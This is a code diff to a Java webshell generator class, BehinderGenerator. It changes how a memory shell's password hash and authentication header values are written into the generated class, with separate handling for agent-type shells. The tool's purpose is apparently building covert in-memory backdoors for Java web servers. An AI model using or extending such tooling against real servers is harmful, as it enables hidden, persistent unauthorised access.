@@ -1,14 +1,18 @@
 package com.reajason.javaweb.memshell.generator;
 
+import com.reajason.javaweb.buddy.LdcReAssignVisitorWrapper;
 import com.reajason.javaweb.buddy.LogRemoveMethodVisitor;
 import com.reajason.javaweb.buddy.ServletRenameVisitorWrapper;
 import com.reajason.javaweb.buddy.TargetJreVersionVisitorWrapper;
 import com.reajason.javaweb.memshell.config.BehinderConfig;
+import com.reajason.javaweb.memshell.config.Constants;
 import com.reajason.javaweb.memshell.config.ShellConfig;
 import net.bytebuddy.ByteBuddy;
 import net.bytebuddy.dynamic.DynamicType;
 import org.apache.commons.codec.digest.DigestUtils;
 import org.apache.commons.lang3.StringUtils;
+
+import java.util.Map;
 
 import static net.bytebuddy.matcher.ElementMatchers.named;
 
@@ -37,10 +41,7 @@ public class BehinderGenerator {
         DynamicType.Builder<?> builder = new ByteBuddy()
                 .redefine(behinderConfig.getShellClass())
                 .name(behinderConfig.getShellClassName())
-                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()))
-                .field(named("pass")).value(md5Key)
-                .field(named("headerName")).value(behinderConfig.getHeaderName())
-                .field(named("headerValue")).value(behinderConfig.getHeaderValue());
+                .visit(new TargetJreVersionVisitorWrapper(shellConfig.getTargetJreVersion()));
 
         if (shellConfig.isJakarta()) {
             builder = builder.visit(ServletRenameVisitorWrapper.INSTANCE);
@@ -48,6 +49,20 @@ public class BehinderGenerator {
 
         if (shellConfig.isDebugOff()) {
             builder = LogRemoveMethodVisitor.extend(builder);
+        }
+
+        if (shellConfig.getShellType().startsWith(Constants.AGENT)) {
+            builder = builder.visit(
+                    new LdcReAssignVisitorWrapper(Map.of(
+                            "pass", md5Key,
+                            "headerName", behinderConfig.getHeaderName(),
+                            "headerValue", behinderConfig.getHeaderValue()
+                    ))
+            );
+        } else {
+            builder = builder.field(named("pass")).value(md5Key)
+                    .field(named("headerName")).value(behinderConfig.getHeaderName())
+                    .field(named("headerValue")).value(behinderConfig.getHeaderValue());
         }
         return builder;
     }
